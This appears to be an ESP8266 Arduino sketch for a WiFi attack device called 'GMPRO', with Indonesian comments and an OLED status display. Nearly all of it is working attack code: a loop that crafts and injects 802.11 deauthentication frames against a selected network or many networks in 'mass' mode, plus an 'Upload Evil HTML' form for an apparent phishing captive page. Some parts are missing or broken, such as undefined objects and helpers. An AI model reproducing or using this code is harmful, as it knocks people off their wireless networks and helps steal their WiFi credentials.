#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include "SSD1306Wire.h"

extern "C" {
#include "user_interface.h"
int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
}

// OLED 64x48
SSD1306Wire display(0x3c, 4, 5, GEOMETRY_64_48);

_Network _networks[16];
_Network _selectedNetwork;
String _logs = "";
String _customHTML = "";
String _tryPassword = "";
uint32_t _deauthCount = 0;
bool deauthing_active = false;
bool mass_deauth = false;
bool hotspot_active = false;
unsigned long now = 0;
unsigned long deauth_now = 0;

void updateOLED(String status) {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 0, "GM-PRO");
  display.drawString(0, 10, "Pkt:" + String(_deauthCount));
  display.drawString(0, 22, "ST:" + status);
  if(deauthing_active) display.drawString(0, 34, "ATTACKING..");
  display.display();
}

void addLog(String msg) {
  _logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _logs;
}

// Fungsi Menggambar Bar Sinyal
String getSignalBar(int rssi) {
  int quality = 2 * (rssi + 100);
  if (quality > 100) quality = 100;
  if (quality < 0) quality = 0;
  return String(quality) + "%";
}

void handleUpload() {
  if (webServer.hasArg("html_content")) {
    _customHTML = webServer.arg("html_content");
    addLog("Custom HTML Uploaded");
  }
  webServer.send(200, "text/html", "OK");
}

void handleIndex() {
  if (webServer.hasArg("clear_logs")) { _logs = ""; }
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        updateOLED("SEL:" + _selectedNetwork.ssid);
      }
    }
  }
  
  // HTML UI dengan CSS Dinamis
  String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{background:#111;color:#0f0;font-family:monospace;} .btn{padding:12px;margin:5px;display:inline-block;text-decoration:none;border-radius:4px;font-weight:bold;}";
  html += ".on{background:#f00;color:#fff;} .off{background:#0a0;color:#fff;}";
  html += "table{width:100%;border-collapse:collapse;} td{border-bottom:1px solid #333;padding:8px;}";
  html += ".bar-bg{background:#333;width:100px;display:inline-block;height:10px;} .bar-fill{background:#0f0;height:10px;}</style></head><body>";
  
  html += "<h2>GMPRO V3.9</h2>";
  
  // Tombol Dinamis
  String d_class = deauthing_active ? "on" : "off";
  html += "<a class='btn " + d_class + "' href='/?deauth=" + (deauthing_active ? "stop" : "start") + "'>DEAUTH</a> ";
  
  String m_class = mass_deauth ? "on" : "off";
  html += "<a class='btn " + m_class + "' href='/?mass=" + (mass_deauth ? "stop" : "start") + "'>MASS</a><br>";

  // WiFi List dengan Bar
  html += "<h3>WiFi List</h3><table>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") break;
    int sig = _networks[i].rssi; // Pastikan struct _Network punya rssi
    html += "<tr><td>CH" + String(_networks[i].ch) + "</td><td>" + _networks[i].ssid + "</td>";
    html += "<td><div class='bar-bg'><div class='bar-fill' style='width:" + getSignalBar(sig) + "'></div></div></td>";
    html += "<td><a class='btn off' style='padding:4px' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>SEL</a></td></tr>";
  }
  html += "</table>";

  // Logs Area
  html += "<h3>Logs</h3><pre style='background:#000;padding:10px;height:100px;overflow:scroll;'>" + _logs + "</pre>";
  html += "<a href='/?clear_logs=1' style='color:#f00'>Clear Logs</a>";

  // Upload Section
  html += "<h3>Upload Evil HTML</h3><form action='/upload' method='POST'><textarea name='html_content' rows='5' style='width:100%'></textarea><br><input type='submit' value='Apply HTML'></form>";
  
  html += "</body></html>";
  webServer.send(200, "text/html", html);
}

void setup() {
  display.init();
  display.flipScreenVertically();
  updateOLED("START");
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAP("GMpro_Admin", "sangkur87");
  
  webServer.on("/", handleIndex);
  webServer.on("/upload", HTTP_POST, handleUpload);
  webServer.begin();
  addLog("System Ready");
}

void loop() {
  webServer.handleClient();
  
  // Deauth Engine
  if ((deauthing_active || mass_deauth) && millis() - deauth_now >= 200) {
    // Logika Mass Deauth (pindah-pindah channel)
    static int mass_idx = 0;
    if(mass_deauth) {
       _selectedNetwork = _networks[mass_idx];
       mass_idx = (mass_idx + 1) % 10;
    }

    wifi_set_channel(_selectedNetwork.ch);
    uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
    
    if(wifi_send_pkt_freedom(pkt, 26, 0) == 0) _deauthCount++;
    deauth_now = millis();
    updateOLED("ATTACK");
  }
}
